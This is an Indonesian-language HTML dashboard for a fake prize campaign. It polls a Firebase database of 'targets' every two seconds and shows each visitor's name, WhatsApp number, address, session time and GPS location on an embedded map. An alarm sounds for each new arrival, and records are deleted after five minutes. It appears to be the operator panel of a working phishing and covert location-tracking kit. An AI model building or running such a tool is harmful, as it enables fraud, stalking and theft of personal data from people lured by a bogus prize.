<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Dashboard Pemenang Hadiah</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: #00ff41; padding: 20px; margin: 0; }
        .grid { display: grid; grid-template-columns: 1fr 450px; gap: 20px; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; color: #c9d1d9; }
        th, td { padding: 10px; border: 1px solid #30363d; text-align: left; font-size: 11px; }
        th { background: #00ff41; color: #000; font-size: 10px; }
        .session-time { color: #fbbf24; }
        .map-box { height: 350px; background: #000; border: 1px solid #00ff41; margin-top: 10px; }
        iframe { width: 100%; height: 100%; border: none; filter: invert(90%); }
    </style>
</head>
<body>

<h1>[ SISTEM MONITORING DATA PEMENANG ]</h1>

<div class="grid">
    <div class="card">
        <h3>LIST PENGUNJUNG & FORMULIR</h3>
        <table>
            <thead>
                <tr>
                    <th>NAMA</th>
                    <th>WHATSAPP</th>
                    <th>ALAMAT</th>
                    <th>SESI</th>
                    <th>AKSI</th>
                </tr>
            </thead>
            <tbody id="targetList"></tbody>
        </table>
    </div>

    <div class="card">
        <h3>DETAIL LOKASI & INFO</h3>
        <div id="infoBox">Klik tombol "DETAIL" pada tabel.</div>
        <div class="map-box" id="mapBox"></div>
    </div>
</div>

<audio id="alarmSound" src="https://www.soundjay.com/buttons/beep-07a.mp3"></audio>

<script>
    const BASE_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
    let known = new Set();

    function update() {
        fetch(`${BASE_URL}.json`)
        .then(res => res.json())
        .then(data => {
            const tbody = document.getElementById('targetList');
            if (!data) { tbody.innerHTML = "<tr><td colspan='5'>Menunggu pengunjung...</td></tr>"; return; }

            let html = "";
            for (let id in data) {
                const t = data[id];
                const diff = Math.floor((Date.now() - t.start_time) / 1000);
                
                // Alarm untuk pendatang baru
                if (!known.has(id)) {
                    document.getElementById('alarmSound').play().catch(()=>{});
                    known.add(id);
                }

                // Pembersihan otomatis jika tidak aktif > 5 menit
                if ((Date.now() - t.updated_at) > 300000) {
                    fetch(`${BASE_URL}/${id}.json`, { method: 'DELETE' });
                    continue;
                }

                html += `
                    <tr>
                        <td><b>${t.nama}</b></td>
                        <td>${t.phone}</td>
                        <td style="max-width:150px; overflow:hidden;">${t.alamat}</td>
                        <td class="session-time">${Math.floor(diff/60)}m ${diff%60}d</td>
                        <td><button onclick="showDetail('${t.lat}','${t.lon}','${t.nama}','${t.phone}','${t.alamat}')" style="background:#00ff41; border:none; padding:5px; font-size:10px; cursor:pointer;">DETAIL</button></td>
                    </tr>
                `;
            }
            tbody.innerHTML = html;
        });
    }

    function showDetail(lat, lon, nama, phone, alamat) {
        document.getElementById('infoBox').innerHTML = `<b>Pemenang:</b> ${nama} (${phone})<br><b>Alamat:</b> ${alamat}`;
        const mURL = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
        document.getElementById('mapBox').innerHTML = `<iframe src="${mURL}"></iframe>`;
    }

    setInterval(update, 2000);
</script>
</body>
</html>
